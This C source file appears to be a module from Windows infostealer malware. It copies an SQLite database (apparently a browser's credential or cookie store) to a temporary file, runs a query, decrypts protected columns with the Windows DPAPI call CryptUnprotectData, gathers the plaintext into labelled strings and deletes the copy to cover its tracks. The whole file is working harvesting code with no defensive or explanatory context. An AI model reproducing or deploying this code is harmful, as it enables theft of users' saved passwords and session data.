#include <windows.h>
#include <shlwapi.h>
#include <stdint.h>
#include "sqlite3.h"
#include "export.h"
#include "vector.h"
#include "fncs.h"
#include "mem.h"

char *UnProtect(BYTE* pass, SIZE_T srclen, SIZE_T* out_len) {
	DATA_BLOB in;
	DATA_BLOB out;

	if (pass == NULL || srclen < 1) {
		CHAR* m = (CHAR*)_alloc(2);
		lstrcpyA(m, " ");
		return m;
	}

	in.pbData = (BYTE*)_alloc(srclen);
	in.cbData = srclen;
	_copy(in.pbData, pass, srclen);

	if (CryptUnprotectData(&in, 0, 0, 0, 0, 0, &out)) {
		char *decrypted_mem = (char *)_alloc(out.cbData + 1);
		char *decrypted = (char *)out.pbData;

		_copy(decrypted_mem, decrypted, out.cbData);

		_free(in.pbData);
		LocalFree(out.pbData);

		out_len[0] = out.cbData;
		return decrypted_mem;
	}
	else {
		_free(in.pbData);
		return NULL;
	}
}

BOOL checkEncrypted(int e[], int s, int in) {
	for (int i = 0; i < s; i++) {
		if ((e[i] - 1) == in) return 1;
	}
	return 0;
}

LPCWSTR moveRandom(LPCWSTR path) {
	DWORD dwAttrib = GetFileAttributesW(path);

	BOOL exists = (dwAttrib != INVALID_FILE_ATTRIBUTES &&
		!(dwAttrib & FILE_ATTRIBUTE_DIRECTORY));

	if (exists) {
		WCHAR* newPath = (WCHAR*)_alloc(MAX_PATH * sizeof(WCHAR));
		SIZE_T ticks = GetTickCount();
		wnsprintfW(newPath, 260, L"%s%u", path, ticks);
		if (!CopyFileW(path, newPath, FALSE)) return 0;

		return newPath;
	}
	else return 0;
}

char* makeString(BYTE* data, CHAR* append, SIZE_T append_len, SIZE_T len) {
	BYTE* mem = (BYTE*)_alloc(append_len + len + 4);
	if (append) lstrcpyA((char*)mem, append);
	if (data) data != 0 ? lstrcatA((char*)mem, (char*)data) : lstrcpyA((char*)mem, (char*)data);

	return (char*)mem;
}

void _sqliteProcessFunc(vector* v, SIZE_T* count_value, LPCWSTR dbPath, LPCSTR query, LPCSTR endstr, int addrn, int count, int encrypted_columns[], char* columns_prefix[], int encrypted_columns_count) {
	LPCWSTR db_path = moveRandom(dbPath);

	if (db_path != 0 && dbPath != 0) {
		sqlite3_stmt *stmt;
		sqlite3 *db;

		if (sqlite3_open16(db_path, &db) == SQLITE_OK) {
			if (sqlite3_prepare_v2(db, query, -1, &stmt, 0) == SQLITE_OK) {
				while (sqlite3_step(stmt) == SQLITE_ROW) {
					SIZE_T size = 0;
					for (int i = 0; i < count; i++) {
						if (checkEncrypted(encrypted_columns, encrypted_columns_count, i)) {
							BYTE *bytes = (BYTE *)sqlite3_column_blob(stmt, i);
							SIZE_T bytes_len = sqlite3_column_bytes(stmt, i);
							CHAR* decrypted = UnProtect(bytes, bytes_len, &size);

							CHAR* out_str = makeString((BYTE*)decrypted, columns_prefix[i], size, lstrlenA(columns_prefix[i]));
							_free(decrypted);
							vector_add(v, out_str);

							if(addrn) vector_add(v, makeString((BYTE*)"\r\n", (char*)"", 0, 2));
							*count_value += 1;
						}
						else {
							BYTE *bytes = (BYTE *)sqlite3_column_blob(stmt, i);
							SIZE_T bytes_len = sqlite3_column_bytes(stmt, i);
							CHAR* v_val = makeString(bytes, columns_prefix[i], lstrlenA(columns_prefix[i]), bytes_len);

							vector_add(v, v_val);
							if (addrn) vector_add(v, makeString((BYTE*)"\r\n", (char*)"", 0, 2));
							*count_value += 1;
						}
					}
					vector_add(v, makeString((BYTE*)endstr, (char*)"", 0, lstrlenA(endstr)));
				}
			}
			sqlite3_finalize(stmt);
			sqlite3_close(db);
		}
	}
	if (db_path) DeleteFileW(db_path);
	if (db_path) _free((void*)db_path);
}

vector sqliteProcessFunction(LPCWSTR dbPath, SIZE_T* count_value, LPCSTR query, LPCSTR endstr, int addrn, int count, int encrypted_columns[], char* columns_prefix[], int encrypted_columns_count) {
	vector v;
	vector_init(&v);
	_sqliteProcessFunc(&v, count_value, dbPath, query, endstr, addrn, count, encrypted_columns, columns_prefix, encrypted_columns_count);
	return v;
}

void vec_get_str(vector v, CHAR** c, SIZE_T* s, SIZE_T prefix_len) {
	SIZE_T d_size = 0;
	SIZE_T now_copy = 0;

	SIZE_T v_size = vector_count(&v);

	for (int i = 0; i < v_size; i++) {
		d_size += lstrlenA((CHAR*)vector_get(&v, i));
	}

	SIZE_T out_size = ((v_size * (prefix_len + 3)) + d_size) + 1;
	CHAR * out_mem = (CHAR*)_alloc(out_size);

	for (int i = 0; i < v_size; i++) {
		CHAR* c = (CHAR*)vector_get(&v, i);
		wnsprintfA(out_mem + now_copy, out_size - now_copy, "%s", c);
		//_copy((out_mem + now_copy), c, lstrlenA(c));
		now_copy += lstrlenA(c);
		_free(c);
	}

	c[0] = out_mem;
	s[0] = lstrlenA(out_mem);
}